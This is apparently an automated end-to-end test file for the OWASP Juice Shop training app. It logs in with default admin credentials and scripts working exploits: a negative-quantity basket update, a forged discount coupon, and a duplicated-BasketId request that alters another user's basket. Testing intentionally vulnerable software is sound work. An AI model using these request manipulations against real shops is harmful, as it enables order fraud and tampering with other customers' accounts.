import { ElementFinder, browser, by, element, protractor } from 'protractor'

describe('/#/basket', () => {
  
        beforeEach(() => {
        
          
            browser.get('/#/login')
            element(by.id('email')).sendKeys('admin@juice-sh.op')
            element(by.id('password')).sendKeys('admin123')
            element(by.id('loginButton')).click()
            element(by.css('.close-dialog')).isPresent().then(function(result) {
              if ( result ) {
                element(by.css('.close-dialog')).click()
              } 
              
          });
            
     
        })
      describe('negative oderchallenge "negativeOrder"', () => {
        it('to update a basket to a negative quantity via the Rest API', () => {
          browser.waitForAngularEnabled(false)
          browser.executeScript('var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 200) { console.log("Success"); }}; xhttp.open("PUT","http://localhost:3000/api/BasketItems/1", true); xhttp.setRequestHeader("Content-type","application/json"); xhttp.setRequestHeader("Authorization",`Bearer ${localStorage.getItem("token")}`); xhttp.send(JSON.stringify({"quantity": -100000}));') // eslint-disable-line
          browser.driver.sleep(1000)
          browser.waitForAngularEnabled(true)
  
          browser.get('/#/order-summary')
  
          const productQuantities = element.all(by.css('mat-cell.mat-column-quantity > span'))
          expect(productQuantities.first().getText()).toMatch(/-100000/)
        })
  
        it('should be possible to place an order with a negative total amount', () => {
          element(by.id('checkoutButton')).click()
        })
      })

      describe('coupon challenge "forgedCoupon"', () => {
       
        it('90% discount using z85 utility', () => {
          browser.executeScript('window.localStorage.couponPanelExpanded = false;')
  
          browser.get('/#/payment/shop')
          browser.driver.sleep(1000)
          element(by.id('collapseCouponElement')).click()
          browser.wait(protractor.ExpectedConditions.presenceOf(element(by.css('#coupon'))), 5000, 'Coupon textfield not present.') // eslint-disable-line no-undef
          browser.driver.sleep(1000)
          element(by.id('coupon')).sendKeys('pes[Biw0lB')
          browser.driver.sleep(1000)
          element(by.id('applyCouponButton')).click()
        })
  
        it('should be possible to place an order with a forged coupon', () => {
          browser.get('/#/order-summary')
          element(by.id('checkoutButton')).click()
        })
  
        
      })

      describe('basic challenge "basketManipulateChallenge"', () => {
        it(' manipulate basket of other user ', () => {
          browser.waitForAngularEnabled(false)
          browser.executeScript(() => {
            var xhttp = new XMLHttpRequest()
            xhttp.onreadystatechange = function () {
              if (this.status === 200) {
                console.log('Success')
              }
            }
  
            xhttp.open('POST', 'http://localhost:3000/api/BasketItems/')
            xhttp.setRequestHeader('Content-type', 'application/json')
            xhttp.setRequestHeader('Authorization', `Bearer ${localStorage.getItem('token')}`)
            xhttp.send('{ "ProductId": 14,"BasketId":"1","quantity":1,"BasketId":"2" }') //eslint-disable-line
          })
          browser.driver.sleep(1000)
          browser.waitForAngularEnabled(true)
        })
  
        
      })
    })
   

